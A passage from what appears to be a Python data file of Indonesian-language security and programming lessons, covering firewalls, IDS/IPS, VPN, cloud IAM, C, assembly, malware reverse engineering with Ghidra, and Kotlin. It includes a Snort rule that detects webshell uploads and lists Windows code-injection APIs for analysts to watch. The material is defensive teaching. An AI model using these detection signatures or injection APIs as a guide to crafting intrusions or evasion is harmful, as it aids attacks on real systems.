             "- VLAN (Virtual LAN): Memisahkan broadcast domain pada Layer 2 Switch tanpa menambah kabel fisik.\n- Trunk Port: Port switch khusus yang membawa lalu lintas banyak VLAN sekaligus (802.1Q).",
             "Jangan izinkan jaringan Wi-Fi tamu terhubung langsung ke zona server internal tanpa melewati firewall."),

            ("Stateful vs Stateless Firewall Filtering",
             "Stateless hanya melihat informasi paket saat itu, sedangkan Stateful mengingat riwayat koneksi sebelumnya.",
             "Stateful Firewall memberikan tingkat keamanan yangauh lebih tinggi dan mencegah pemalsuan paket.",
             "text",
             "PERBEDIAN UTAMA:\n- Stateless: Memeriksa setiap paket secara independen berdasarkan IP asal/tujuan dan Port saja.\n- Stateful : Memantau tabel sesi (State Table). Jika paket balasan tidak memiliki catatan permintaan awal di State Table, paket langsung DITOLAK!",
             "- State Table: Tabel di memori firewall yang mencatat sesi TCP/UDP aktif (SYN_SENT, ESTABLISHED).\n- Performance Impact: Stateful membutuhkan konsumsi memori lebih besar untuk mencatat sesi aktif.",
             "Gunakan Stateful Firewall untuk mengamankan perimeter jaringan utama perusahaan."),

            ("Merancang Policy & Rule Base Security",
             "Menyusun dokumen kebijakan keamanan dan menerjemahkannya ke dalam konfigurasi firewall yang rapi.",
             "Memastikan aturan firewall tetap terorganisir dan tidak menyisakan aturan usang yang berbahaya.",
             "text",
             "MATRIKS ATURAN FIREWALL (POLICY MATRIX):\nSource Zone | Dest Zone | Port/Protocol | Action | Description\n---------------------------------------------------------------\nDMZ         | DB_Zone   | TCP 5432      | PERMIT | Web ke Postgres DB\nInternal    | DMZ       | TCP 443       | PERMIT | Akses Admin ke Web\nAny         | Any       | Any           | DENY   | Explicit Final Block",
             "- Explicit Deny: Aturan penutup paling bawah untuk memblokir seluruh akses yang tidak terdaftar.\n- Rule Audit: Peninjauan berkala untuk menghapus aturan sementara yang sudah tidak digunakan.",
             "Beri label dan deskripsi tanggal serta nama pemohon pada setiap aturan firewall baru."),
        ],

        "IDS / IPS": [
            ("Konsep Intrusion Detection & Prevention (Snort / Suricata)",
             "IDS ibarat CCTV yang membunyikan alarm saat ada penyusup, IPS ibarat pintu otomatis yang langsung terkunci.",
             "Mendeteksi dan menghentikan eksploitasi serangan siber sebelum merusak sistem internal.",
             "text",
             "PERBEDIAN OPERASIONAL:\n- IDS (Promiscuous Mode): Menerima salinan trafik jaringan via SPAN/TAP Port. Tidak memblokir paket, hanya memberi peringatan (Alert).\n- IPS (In-Line Mode)    : Dipasang langsung di tengah jalur komunikasi paket. Dapat aktif membuang paket berbahaya (Drop/Reject).",
             "- TAP / SPAN Port: Fitur switch jaringan untuk menduplikasi seluruh paket dan mengarahkannya ke sensor IDS.\n- Inline Latency: IPS menambah sedikit penundaan (latency) karena harus memproses setiap paket data.",
             "Mulaikan penerapan alat baru di mode IDS (passive) sebelum mengaktifkan mode pemblokiran IPS (inline)."),

            ("Signature-Based vs Anomaly-Based Detection",
             "Signature mengenali cap sidik jari kejahatan yang sudah dikenal, Anomaly mengenali penyimpangan kebiasaan.",
             "Kombinasi kedua metode memberikan perlindungan terbaik terhadap ancaman lama dan Zero-Day.",
             "text",
             "METODE DETEKSI:\n- Signature-Based: Membandingkan paket dengan pola serangan yang tersimpan di database (Sangat akurat untuk ancaman lama).\n- Anomaly-Based  : Menggunakan Machine Learning untuk mempelajari perilaku normal. Mengeluarkan alert jika ada lonjakan trafik tak wajar.",
             "- Zero-Day Attack: Serangan siber baru yang belum memiliki pola sidik jari (signature) di database.\n- False Positive High: Deteksi anomali berpotensi menghasilkan banyak lansiran palsu di awal.",
             "Perbarui pustaka signature IDS/IPS kamu secara otomatis setiap hari."),

            ("Menulis Rule Snort Kustom untuk Deteksi Ancaman",
             "Membuat aturan kustom di alat Snort/Suricata untuk mencegat eksploitasi spesifik di jaringanmu.",
             "Memberikan perlindungan cepat saat terjadi ancaman kerentanan baru yang belum ada patch-nya.",
             "text",
             "CONTOH RULE SNORT (DETEKSI WEBSHELL UPLOAD):\nalert tcp $EXTERNAL_NET any -> $HOME_NET 80 (\n  msg:\"MALICIOUS WebShell Upload Attempt\";\n  content:\"POST\"; http_method;\n  content:\"eval(base64_decode\"; http_client_body;\n  sid:1000001; rev:1;\n)",
             "- Rule Header (`alert tcp ...`): Menentukan aksi, protokol, serta IP dan port sumber/tujuan.\n- Rule Options (`msg`, `content`, `sid`): Isi spesifik pola teks yang dicari dan nomor identitas unik aturan.",
             "Pastikan setiap aturan kustom memiliki nomor `sid` unik di atas 1.000.000."),

            ("Penanganan Alert & Automated Blocking Response",
             "Mengintegrasikan alat IPS dengan Firewall untuk memblokir IP penyerang secara otomatis di tempat.",
             "Meminimalkan waktu respons ancaman dari hitungan jam menjadi hitungan milidetik.",
             "text",
             "ALUR RESPONSE OTOMATIS:\n1. Sensor IPS menemukan paket penyerang yang cocok dengan Signature #1000001\n2. IPS mengeksekusi aksi `drop` dan mengirim perintah ke Firewall via API\n3. Firewall memasukkan IP Penyerang ke daftar Hitam (Blacklist) selama 24 jam\n4. Notifikasi terkirim ke kanal Slack tim SOC",
             "- Dynamic Blacklisting: Memblokir IP penyerang sementara waktu untuk mencegah pemblokiran permanen yang salah target.\n- Fail-Open vs Fail-Close: Kebijakan penanganan jika IPS mengalami kegagalan/crash.",
             "Gunakan fitur rate-limiting pada aksi pemblokiran otomatis untuk mengantisipasi serangan Spoofing."),
        ],

        "VPN & Secure Access": [
            ("Kriptografi & Protokol Enkripsi VPN (IPsec / OpenVPN)",
             "VPN membuat terowongan terenkripsi yang aman di atas jaringan internet publik yang tidak aman.",
             "Memungkinkan karyawan bekerja dari mana saja tanpa khawatir data bisnis diintip oleh hacker.",
             "text",
             "KOMPONEN KRIPTOGRAFI VPN:\n- Handshake & Key Exchange: Menggunakan Diffie-Hellman (DH Group) untuk menyepakati kunci enkripsi.\n- Symmetric Encryption   : Menggunakan AES-256-GCM untuk mengenkripsi seluruh lalu lintas data terowongan.\n- Data Integrity         : Menggunakan HMAC-SHA256 untuk menjamin data tidak diubah di tengah jalan.",
             "- IPsec (IP Security): Protokol VPN standar industri pada Layer 3, terbagi menjadi mode Transport dan Tunnel.\n- OpenVPN / WireGuard: Protokol VPN modern berbasis SSL/TLS dan UDP yang sangat cepat dan fleksibel.",
             "Gunakan WireGuard atau OpenVPN berbasis AES-256 untuk keseimbangan performa dan keamanan terbaik."),

            ("Prinsip Arsitektur Zero Trust Network Access (ZTNA)",
             "Zero Trust berpegang pada prinsip: 'Jangan pernah percaya, selalu verifikasi setiap request'.",
             "Menggantikan konsep VPN tradisional yang menganggap semua perangkat di dalam jaringan internal aman.",
             "text",
             "3 PILAR UTAMA ZERO TRUST:\n1. Explicit Verification: Autentikasi dan otorisasi selalu dilakukan berdasarkan seluruh titik data yang ada.\n2. Least Privilege Access: Berikan hak akses terbatas hanya pada aplikasi spesifik yang dibutuhkan saja.\n3. Assume Breach       : Selalu anggap bahwa jaringan internal sudah disusupi peretas.",
             "- ZTNA vs VPN: VPN memberikan akses ke seluruh subnet jaringan; ZTNA hanya memberikan akses ke 1 aplikasi spesifik.\n- Identity-Aware Proxy: Gerbang yang memeriksa identitas dan kesehatan perangkat sebelum memberi jalan masuk.",
             "Terapkan evaluasi konteks perangkat (misal: apakah antivirus aktif?) sebelum mengizinkan akses koneksi."),

            ("Multi-Factor Authentication (MFA) Integration",
             "MFA mewajibkan dua atau lebih bukti verifikasi berbeda sebelum mengizinkan proses login.",
             "Menangkal 99% serangan pembobolan kata sandi akibat pencurian kredensial (phishing/brute force).",
             "text",
             "KATEGORI FAKTOR AUTENTIKASI:\n1. Something You Know : Password / PIN\n2. Something You Have : Aplikasi Authenticator (TOTP), YubiKey, SMS\n3. Something You Are  : Sidik Jari, Pengenalan Wajah (Biometric)",
             "- TOTP (Time-Based One-Time Password): Kode 6 digit acak yang berubah setiap 30 detik pada aplikasi mobile.\n- Push Notification MFA: Konfirmasi satu ketukan di smartphone yang jauh lebih aman dibanding SMS OTP.",
             "Hindari penggunaan SMS sebagai faktor kedua karena rawan terhadap serangan SIM Swapping."),

            ("Merancang Akses Remote Kerja yang Aman",
             "Menggabungkan VPN/ZTNA, MFA, dan pemantauan Endpoint untuk mengamankan budaya kerja jarak jauh (Work From Anywhere).",
             "Menjaga produktivitas karyawan tanpa mengorbankan standar keamanan siber perusahaan.",
             "text",
             "ARSITEKTUR KONEKSI REMOTE AMAN:\nKaryawan (Laptop Perusahaan + EDR) \n  --> MFA Prompt (TOTP) \n  --> ZTNA Gateway (TLS 1.3) \n  --> Aplikasi Internal Khusus",
             "- EDR (Endpoint Detection and Response): Agen pemantau kesehatan dan malware di laptop karyawan.\n- Split Tunneling: Mengarahkan hanya trafik bisnis ke jaringan perusahaan, sedangkan trafik browsing biasa ke internet langsung.",
             "Wajibkan enkripsi penuh pada harddisk laptop kerja karyawan (BitLocker / FileVault)."),
        ],

        "IAM & Cloud Security": [
            ("Identity & Access Management (IAM) & Principle of Least Privilege",
             "IAM adalah sistem terpusat untuk mengelola siapa yang memiliki hak akses ke sumber daya cloud.",
             "Mencegah kebocoran data akibat pemberian hak akses yang terlalu luas kepada akun karyawan.",
             "json",
             "/* Kebijakan AWS IAM (Least Privilege) */\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Action\": [\"s3:GetObject\"],\n    \"Resource\": \"arn:aws:s3:::learnwithacel-public-assets/*\"\n  }]\n}",
             "- Principle of Least Privilege: Memberikan hak akses paling minimal yang cukup untuk menyelesaikan pekerjaan.\n- IAM Roles vs Users: Gunakan Role sementara (temporary credentials) untuk aplikasi, bukan User permanen.",
             "Jangan pernah menggunakan akun Root Cloud untuk operasional pekerjaan sehari-hari."),

            ("Cloud Security Posture & Shared Responsibility Model",
             "Memahami pembagian tanggung jawab keamanan antara penyedia Cloud (AWS/GCP) dan pengguna.",
             "Mencegah asumsi salah yang menganggap semua keamanan data otomatis ditangani oleh penyedia cloud.",
             "text",
             "MODEL TANGGUNG JAWAB BERSAMA (SHARED RESPONSIBILITY):\n- Penyedia Cloud (AWS/GCP): Keamanan FISIK data center, kabel jaringan, hardware server, dan hypervisor.\n- Pengguna Cloud (Kamu)   : Keamanan DATA, konfigurasi IAM, Firewall (Security Group), enkripsi, dan aplikasi.",
             "- CSPM (Cloud Security Posture Management): Alat otomatis untuk mendeteksi salah konfigurasi di cloud.\n- Misconfiguration: Penyebab utama #1 insiden kebocoran data di infrastruktur cloud.",
             "Aktifkan audit otomatis untuk memindai bucket penyimpanan cloud yang terbuka secara tidak sengaja."),

            ("Securing Cloud API Gateways & Storage Buckets",
             "Mengatur batasan izin akses pada Cloud Storage Buckets (S3) dan memperketat gerbang API.",
             "Mencegah terbukanya file rahasia perusahaan ke publik internet secara tidak sengaja.",
             "json",
             "/* S3 Bucket Policy - Blokir Akses Publik */\n{\n  \"BlockPublicAcls\": true,\n  \"BlockPublicPolicy\": true,\n  \"IgnorePublicAcls\": true,\n  \"RestrictPublicBuckets\": true\n}",
             "- S3 Block Public Access: Fitur penyelamat yang memblokir seluruh akses publik ke isi bucket storage.\n- API Gateway Throttling: Membatasi jumlah panggilan API untuk mencegah pembengkakan tagihan cloud (Wallet Leaks).",
             "Aktifkan fitur enkripsi otomatis (SSE-S3 / KMS) pada seluruh cloud storage bucket."),

            ("Audit & Compliance di Lingkungan Cloud (AWS / GCP / Azure)",
             "Mengaktifkan pelacakan seluruh jejak aktivitas API di lingkungan cloud untuk kebutuhan audit dan kepatuhan.",
             "Penting untuk memenuhi standar regulasi internasional seperti ISO 27001, SOC2, dan PCI-DSS.",
             "json",
             "/* Contoh Log AWS CloudTrail */\n{\n  \"eventTime\": \"2026-07-22T14:30:00Z\",\n  \"eventName\": \"DeleteBucket\",\n  \"userIdentity\": { \"arn\": \"arn:aws:iam::12345:user/hacker\" },\n  \"sourceIPAddress\": \"198.51.100.25\"\n}",
             "- AWS CloudTrail / GCP Audit Logs: Merekam seluruh panggilan API di infrastruktur cloud beserta identitas pemanggilnya.\n- Continuous Compliance: Memastikan konfigurasi cloud selalu mematuhi standar aturan keamanan.",
             "Kirimkan log CloudTrail ke tempat penyimpanan terpisah yang mengaktifkan fitur WORM (Write Once, Read Many)."),
        ],

        "Bahasa C & Fundamental": [
            ("Manajemen Memori & Pointer di Bahasa C",
             "Bahasa C memberikan kendali penuh langsung ke alamat fisik memori RAM komputer menggunakan Pointer.",
             "Dasar utama untuk memahami bagaimana perangkat lunak bekerja di tingkat paling rendah dan cara membedah malware.",
             "c",
             "#include <stdio.h>\n\nint main() {\n    int angka = 42;\n    int *ptr = &angka; // Pointer menyimpan alamat memori dari variabel 'angka'\n    \n    printf(\"Nilai: %d\\n\", angka);\n    printf(\"Alamat Memori: %p\\n\", (void*)ptr);\n    printf(\"Nilai via Pointer: %d\\n\", *ptr);\n    return 0;\n}",
             "- `&` (Address-of operator): Mengambil alamat lokasi fisik variabel di memori RAM.\n- `*` (Dereference operator): Membaca atau mengubah nilai yang tersimpan di alamat memori yang ditunjuk pointer.",
             "Selalu inisialisasi pointer dengan nilai `NULL` jika belum menunjuk ke variabel manapun."),

            ("Buffer, Stack, dan Heap Memory Layout",
             "Memahami bagaimana program mengalokasikan ruang variabel lokal di Stack dan memori dinamis di Heap.",
             "Sangat penting untuk memahami bagaimana celah serangan Buffer Overflow terjadi.",
             "c",
             "#include <stdlib.h>\n\nvoid fungsiStack() {\n    char bufferStack[64]; // Alokasi otomatis di Stack (ukuran tetap)\n}\n\nvoid fungsiHeap() {\n    char *bufferHeap = (char*)malloc(1024); // Alokasi manual di Heap\n    free(bufferHeap); // Wajib dibebaskan agar tidak leak\n}",
             "- Stack Memory: Wilayah memori cepat berstruktur LIFO yang mengelola fungsi dan variabel lokal.\n- Heap Memory: Wilayah memori besar untuk alokasi dinamis saat program berjalan (`malloc`/`free`).",
             "Selalu bebaskan memori Heap (`free()`) setelah tidak digunakan untuk mencegah kebocoran memori (Memory Leak)."),

            ("Anatomi File Executable PE (Portable Executable)",
             "Format standar file aplikasi di Windows (.exe, .dll) yang menentukan bagaimana OS memuat kode ke memori.",
             "Landasan pengetahuan wajib bagi Malware Analyst untuk mengidentifikasi struktur file berbahaya.",
             "text",
             "STRUKTUR HEADER FILE PE WINDOWS:\n1. DOS Header       : Diawali angka ajaib 'MZ' (0x4D5A)\n2. PE Header        : Berisi Signature 'PE\\0\\0' dan Target Arsitektur (x86/x64)\n3. Optional Header  : Entry Point (titik awal eksekusi kode)\n4. Section Table    :\n   - .text  : Berisi instruksi kode biner executable\n   - .data  : Berisi variabel global terinisialisasi\n   - .rsrc  : Berisi aset gambar/ikon aplikasi\n   - .idata : Berisi Import Address Table (IAT)",
             "- Magic Bytes `MZ`: Penanda awal khas file eksekusi Windows (Mark Zbikowski).\n- Entry Point: Alamat instruksi pertama yang akan dieksekusi oleh CPU saat program dijalankan.",
             "Periksa IAT (Import Address Table) untuk mengetahui fungsi Windows API apa saja yang dipanggil oleh file."),

            ("Pengenalan Windows API & System Calls",
             "Windows API adalah sekumpulan fungsi pustaka bawaan Windows yang dipakai aplikasi untuk berinteraksi dengan OS.",
             "Malware memanfaatkan fungsi Windows API spesifik untuk melakukan injeksi kode dan komunikasi tersembunyi.",
             "c",
             "#include <windows.h>\n\nint main() {\n    // Panggilan Windows API untuk menampilkan MessageBox\n    MessageBoxA(NULL, \"Halo dari Windows API!\", \"Peringatan\", MB_OK | MB_ICONINFORMATION);\n    return 0;\n}",
             "- Win32 API: Antarmuka pemrograman C standar untuk sistem operasi Windows.\n- Native API (`NtCreateThreadEx`): Fungsi internal tingkat lebih rendah yang sering dipakai malware untuk menghindari deteksi.",
             "Amati panggilang API sensitif seperti `VirtualAlloc`, `WriteProcessMemory`, dan `CreateRemoteThread`."),
        ],

        "Assembly Basics": [
            ("Arsitektur CPU & Register x86/x64",
             "Register adalah kotak memori super cepat yang berada di dalam chip prosesor CPU itu sendiri.",
             "Mengetahui tempat CPU menyimpan data sementara saat mengeksekusi instruksi mesin.",
             "text",
             "REGISTER UTAMA ARSITEKTUR x64:\n- RAX : Accumulator (Menyimpan hasil kembalian fungsi/kalkulasi)\n- RBX : Base Register\n- RCX : Counter (Digunakan dalam perulangan loop)\n- RDX : Data Register\n- RSP : Stack Pointer (Menunjuk ke puncak Stack memori saat ini)\n- RBP : Base Pointer (Menunjuk ke dasar Stack Frame fungsi)\n- RIP : Instruction Pointer (Menunjuk ke alamat instruksi BERIKUTNYA yang akan dieksekusi)",
             "- General Purpose Registers: Register rax, rbx, rcx, rdx yang fleksibel dipakai untuk operasi matematika.\n- RIP / EIP: Register paling krusial yang menentukan alur eksekusi instruksi CPU.",
             "Pahami bahwa pada arsitektur 64-bit register diawali huruf 'R' (RAX), sedangkan 32-bit diawali 'E' (EAX)."),

            ("Instruksi Dasar Assembly (MOV, ADD, SUB, PUSH, POP)",
             "Bahasa Assembly adalah bentuk tulisan yang dapat dibaca manusia dari bahasa mesin 0 dan 1.",
             "Kemampuan membaca Assembly memungkinkan analis memahami cara kerja malware tanpa kode sumber.",
             "assembly",
             "; Mengisi data ke register dan kalkulasi sederhana\nMOV RAX, 100       ; Isikan nilai 100 ke register RAX\nMOV RBX, 50        ; Isikan nilai 50 ke register RBX\nADD RAX, RBX       ; RAX = RAX + RBX (Hasil akhir RAX = 150)\n\n; Operasi Stack\nPUSH RAX           ; Simpan nilai RAX ke puncak Stack\nPOP RCX            ; Ambil nilai dari puncak Stack dan simpan ke RCX",
             "- `MOV dest, src`: Menyalin data dari sumber (src) ke tujuan (dest).\n- `PUSH` / `POP`: Menambah atau mengambil data dari Stack memori yang ditunjuk register RSP.",
             "Ingat bahwa urutan operand Assembly sintaks Intel adalah `Instruksi Tujuan, Sumber`."),

            ("Stack Frame, Function Calls & Return Addresses",
             "Memahami bagaimana CPU mengelola pemanggilan fungsi dan mengembalikan jalur ke pemanggilnya.",
             "Memungkinkan pelacakan aliran eksekusi malware saat memanggil fungsi-fungsi berbahaya.",
             "assembly",
             "; Alur Pemanggilan Fungsi (Calling Convention x64)\nMOV RCX, 42        ; Argumen ke-1 dimasukkan ke register RCX\nCALL TambahAngka   ; Simpan alamat balik (RIP) ke Stack & lompat ke fungsi\n\n; Di dalam fungsi TambahAngka:\nPUSH RBP           ; Simpan frame pointer lama\nMOV RBP, RSP       ; Buat stack frame baru\n; ... logika fungsi ...\nPOP RBP            ; Kembalikan frame pointer lama\nRET                ; Ambil alamat balik dari Stack dan kembali ke kode utama",
             "- `CALL`: Menyimpan alamat instruksi berikutnya (Return Address) ke Stack dan melompat ke lokasi fungsi.\n- `RET`: Mengambil Return Address dari Stack dan memasukkannya kembali ke register RIP.",
             "Perhatikan eksploitasi Buffer Overflow yang mencoba menimpa Return Address di Stack."),

            ("Membaca Control Flow & Branching di Assembly",
             "Menganalisis perbandingan data dan keputusan lompatan percabangan (if/else) di bahasa Assembly.",
             "Digunakan untuk membedah logika pemeriksaan lisensi atau mekanis anti-analisis pada malware.",
             "assembly",
             "; Simulasi Struktur IF-ELSE di Assembly\nCMP RAX, 0         ; Bandingkan nilai RAX dengan 0\nJE  Alamat_IsZero  ; Jump if Equal: Lompat ke 'Alamat_IsZero' jika RAX == 0\n\n; Jalur ELSE (Jika RAX != 0)\nMOV RBX, 1\nJMP Selesai        ; Unconditional Jump: Lompat langsung ke Selesai\n\nAlamat_IsZero:\nMOV RBX, 0\n\nSelesai:",
             "- `CMP`: Membandingkan dua nilai dengan cara melakukan pengurangan tanpa menyimpan hasilnya.\n- `JE` / `JNE` / `JG` / `JL`: Conditional Jump yang melompat berdasarkan Flag CPU (Zero Flag, Carry Flag).",
             "Gunakan visualisasi Graph View di Ghidra/IDA Pro untuk membaca percabangan kode Assembly dengan mudah."),
        ],

        "Reverse Engineering": [
            ("Metodologi Statis: Extracting Strings, Hashes & Imports",
             "Analisis statis membedah file biner tanpa mengeksekusinya di komputer.",
             "Langkah cepat pertama yang aman untuk mendapatkan gambaran awal mengenai identitas sampel malware.",
             "bash",
             "# 1. Mengidentifikasi Hash File (MD5 & SHA256)\nsha256sum sample_malware.exe\n\n# 2. Merekam Teks String Terekstraksi dari Biner\nstrings -n 8 sample_malware.exe | grep -i \"http\"",
             "- File Hashing: Menghasilkan nilai sidik jari unik untuk mengecek sampel di VirusTotal.\n- Extracting Strings: Menemukan pesan teks, nama file, URL C2, dan kunci registri yang tersimpan di biner.",
             "Lakukan seluruh proses analisis reverse engineering di dalam lingkungan terisolasi (Virtual Machine)."),

            ("Metodologi Dinamis: Sandbox Testing & Process Monitoring",
             "Analisis dinamis mengamati perilaku malware saat dijalankan secara langsung di dalam lingkungan terisolasi.",
             "Merekam tindakan nyata malware seperti pembuatan file baru, modifikasi registri, dan koneksi jaringan.",
             "text",
             "PERANGKAT ANALISIS DINAMIS:\n- Process Monitor (ProcMon): Merekam aktivitas sistem file, registri, dan proses real-time.\n- Wireshark / INetSim       : Merekam dan mensimulasikan respons layanan jaringan.\n- Cuckoo / ANY.RUN Sandbox  : Platform analisis malware otomatis berbasis cloud/VM.",
             "- ProcMon Filter: Saring berdasarkan nama proses (`Process Name is sample.exe`) untuk mengurangi kebisingan log.\n- Snapshot Recovery: Selalu kembalikan (revert) keadaan VM ke snapshot bersih setelah analisis sampel.",
             "Putus koneksi internet fisik VM analisis untuk mencegah malware menyerang jaringan lokal."),

            ("Identifikasi Unpacking, Decryption & Obfuscation",
             "Mengenali teknik yang dipakai pembuat malware untuk menyembunyikan kode asli mereka dari antivirus.",
             "Membantu analis membuka bungkus (unpacking) kode asli agar dapat didekompilasi dengan sempurna.",
             "text",
             "INDIKATOR FILE TER-PACKING (PACKED BINARY):\n- Jumlah String Sangat Sedikit: Hanya ada sedikit teks yang terbaca saat di-run `strings`.\n- Import Table Sedikit        : Hanya mengimpor `LoadLibrary` dan `GetProcAddress`.\n- Entropy Sangat Tinggi       : Nilai acak data (Entropy > 7.0) menandakan adanya kompresi/enkripsi.",
             "- Packer Umum: UPX, Themida, VMProtect.\n- Unpacking Procedure: Membiarkan stub packer mengeksekusi dekripsi di RAM, lalu melakukan Dump memori.",
             "Gunakan tools `PEID` atau `Detect It Easy (DIE)` untuk mengecek jenis packer yang digunakan file."),

            ("Memory Dump Analysis & Artifact Extraction",
             "Mengambil dan menganalisis isi memori RAM komputer yang terinfeksi untuk mengekstrak muatan malware.",
             "Menemukan kode malware yang terdekripsi atau berada hanya di dalam memori (Fileless Malware).",
             "bash",
             "# Menggunakan Volatility Framework untuk Analisis Memori RAM\nvolatility -f memory.raw --profile=Win7SP1x64 pslist\nvolatility -f memory.raw --profile=Win7SP1x64 malfind -D ./extracted_malware/",
             "- Volatility Framework: Perangkat standar industri untuk analisis forensic memori RAM.\n- `malfind`: Plugin Volatility untuk mengidentifikasi injeksi kode berbahaya di alokasi memori executable.",
             "Simpan hasil ekstraksi sampel biner di folder yang dilindungi kata sandi agar tidak sengaja tertekan."),
        ],

        "Ghidra & IDA Tools": [
            ("Pengenalan Disassembler & Decompiler Ghidra",
             "Ghidra adalah perangkat reverse engineering buatan NSA yang mampu mengubah biner mesin menjadi kode C.",
             "Alat gratis dan sangat kuat untuk membedah arsitektur malware yang kompleks.",
             "text",
             "JENDELA UTAMA GHIDRA:\n1. Program Trees   : Struktur komponen file biner\n2. Symbol Tree      : Daftar fungsi Impor, Ekspor, dan Fungsi Internal\n3. Listing View     : Tampilan instruksi Assembly\n4. Decompiler View  : Kode pseudo C hasil rekonstruksi otomatis",
             "- Decompiler Engine: Mengonversi kode assembly tingkat rendah menjadi struktur pseudocode C yang nyaman dibaca.\n- Symbol Search: Mencari titik awal lokasi fungsi `entry` atau `main`.",
             "Gunakan kombinasi tampilan Assembly (Listing) dan C Decompiler untuk verifikasi analisis yang akurat."),

            ("Navigasi Kode C Hasil Dekompilasi di Ghidra",
             "Mempelajari cara menavigasi percabangan fungsi dan panggilan silang (Cross-References) di Ghidra.",
             "Mempercepat penemuan fungsi utama tempat logika berbahaya malware disimpan.",
             "text",
             "SHORTCUT NAVIGASI GHIDRA PENTING:\n- `L`   : Mengubah nama variabel atau fungsi (Rename)\n- `T`   : Mengubah tipe data variabel (Retype)\n- `Ctrl+Shift+F`: Mencari pemanggilan fungsi spesifik di seluruh biner\n- `X`   : Menampilkan Cross-References (XREFs) ke alamat yang ditunjuk",
             "- XREFs (Cross-References): Menunjukkan lokasi mana saja di dalam kode yang memanggil fungsi tersebut.\n- Pseudocode C Limitations: Hasil dekompilasi tidak selalu 100% presisi dengan kode sumber asli.",
             "Manfaatkan fitur XREFs pada variabel string menarik untuk menemukan fungsi pemrosesnya."),

            ("Memberi Anotasi, Struct, dan Rename Fungsi",
             "Proses dokumentasi aktif saat merekonstruksi fungsi dan struktur data tersembunyi sampel malware.",
             "Mengubah kode rakitan acak yang membingungkan menjadi struktur terorganisir yang mudah dipahami.",
             "c",
             "// SEBELUM DI-RENAME (Default Ghidra Output)\nundefined4 FUN_00401000(char *param_1) {\n    return strcmp(param_1, \"Secret123\");\n}\n\n// SETELAH DI-RENAME & RETYPE PADA ANALISIS\nint CheckAdminPassword(char *inputPassword) {\n    return strcmp(inputPassword, \"Secret123\");\n}",
             "- Renaming Strategy: Beri nama fungsi berdasarkan perilakunya (misal `DownloadPayloadFromC2`).\n- Data Structure Reconstruction: Membuat definisi Struct kustom untuk variabel kompleks.",
             "Beri nama variabel secara konsisten untuk mempermudah dibaca oleh anggota tim analisis lainnya."),

            ("Automasi Analisis Malware dengan Ghidra Python Script",
             "Menulis skrip Python di Ghidra untuk mengotomatisasi dekripsi string dan pencarian pola.",
             "Menghemat waktu berjam-jam kerja manual dengan mengotomatisasi pembedahan sampel malware massal.",
             "python",
             "# Skrip Python Ghidra: Dekripsi XOR String Sederhana\ncurrentProgram = getCurrentProgram()\nmem = currentProgram.getMemory()\n\n# Dekripsi 10 byte data di alamat tertentu menggunakan kunci 0x5A\naddr = toAddr(0x00405012)\nfor i in range(10):\n    b = mem.getByte(addr.add(i))\n    mem.setByte(addr.add(i), (b ^ 0x5A) & 0xFF)\nprint(\"[+] Dekripsi String Selesai!\")",
             "- Ghidra Flat API: Pustaka fungsi Python bawaan Ghidra untuk memanipulasi memori dan simbol program.\n- XOR Decryption: Teknik paling populer yang dipakai malware untuk menyembunyikan string dari pemeriksaan sederhana.",
             "Jalankan skrip Python Ghidra via `Script Manager` untuk dekripsi string otomatis."),
        ],

        # =====================================================================
        # MOBILE DEVELOPMENT
        # =====================================================================
        "Kotlin Basics": [
            ("Sintaks Dasar, Variabel & Null Safety di Kotlin",
             "Kotlin adalah bahasa resmi pembuatan aplikasi Android yang dirancang ringkas dan aman dari NullPointerException.",
             "Fitur Null Safety bawaan Kotlin mengeliminasi penyebab utama aplikasi Android crash di pasaran.",
             "kotlin",
             "fun main() {\n    // 1. Variabel Read-only (val) vs Mutable (var)\n    val appName: String = \"LearnWithAcel\"\n    var userCount: Int = 100\n    \n    // 2. Null Safety System\n    var nullableText: String? = null\n    println(nullableText?.length ?: 0) // Elvis Operator (?:)\n}",
             "- `val` vs `var`: `val` adalah variabel tetap (immutable/const), `var` nilainya dapat diubah di kemudian hari.\n- Safe Call Operator (`?.`): Mengeksekusi properti hanya jika objek tidak bernilai `null`.\n- Elvis Operator (`?:`): Memberikan nilai fallback default jika variabel bernilai `null`.",
             "Gunakan `val` secara default untuk mencegah bug akibat mutasi variabel yang tidak disengaja."),

            ("Control Flow, Functions & Lambda Expressions",
             "Struktur percabangan modern dengan `when` ekspresi dan fungsi ringkas (Single-expression functions).",
             "Menulis logika aplikasi Android yang sangat bersih dan mudah dipelihara.",
             "kotlin",
             "// Single-expression Function & When Expression\nfun getRatingStatus(score: Int): String = when (score) {\n    in 90..100 -> \"Sangat Baik\"\n    in 70..89  -> \"Bagus\"\n    else       -> \"Perlu Belajar\"\n}\n\n// Higher-Order Function dengan Lambda\nfun processNumbers(numbers: List<Int>, action: (Int) -> Unit) {\n    for (num in numbers) action(num)\n}",
             "- `when`: Pengganti `switch-case` tradisional yang jauh lebih fleksibel dan dapat mengembalikan nilai.\n- Higher-Order Function: Fungsi yang dapat menerima fungsi lain (lambda) sebagai parameternya.",
             "Manfaatkan `when` tanpa argumen untuk menyederhanakan rantai `if-else-if` yang panjang."),

            ("Object-Oriented Programming (OOP) & Data Classes",
             "Data Class Kotlin otomatis menghasilkan fungsi `equals()`, `hashCode()`, `toString()`, dan `copy()`.",
             "Mempermudah pembuatan model data aplikasi mobile hanya dalam satu baris kode.",
             "kotlin",
             "// Model Data Kotlin (Otomatis dapat toString, copy, equals)\ndata class User(\n    val id: String,\n    val name: String,\n    val email: String\n)\n\nfun main() {\n    val user1 = User(\"U01\", \"Acel\", \"acel@example.com\")\n    val user2 = user1.copy(name = \"Acel Updated\")\n    println(user2)\n}",
             "- `data class`: Class khusus yang ditujukan murni untuk menampung data/state.\n- `.copy()`: Membuat salinan objek baru dengan beberapa properti yang diperbarui tanpa merubah objek asli.",
             "Gunakan `data class` untuk seluruh response API dan state UI di aplikasi Android-mu."),

            ("Pengenalan Asynchronous dengan Kotlin Coroutines",
             "Coroutines adalah thread ringan untuk menjalankan tugas berat (seperti koneksi API) tanpa membekukan UI.",
             "Membuat aplikasi Android tetap lancar dan responsif 60fps saat mengolah data.",
             "kotlin",
             "import kotlinx.coroutines.*\n\nfun main() = runBlocking {\n    launch {\n        delay(1000L) // Asynchronous non-blocking delay\n        println(\"Data API Berhasil Dimuat!\")\n    }\n    println(\"Menampilkan Shimmer Skeleton Loading UI...\")\n}",
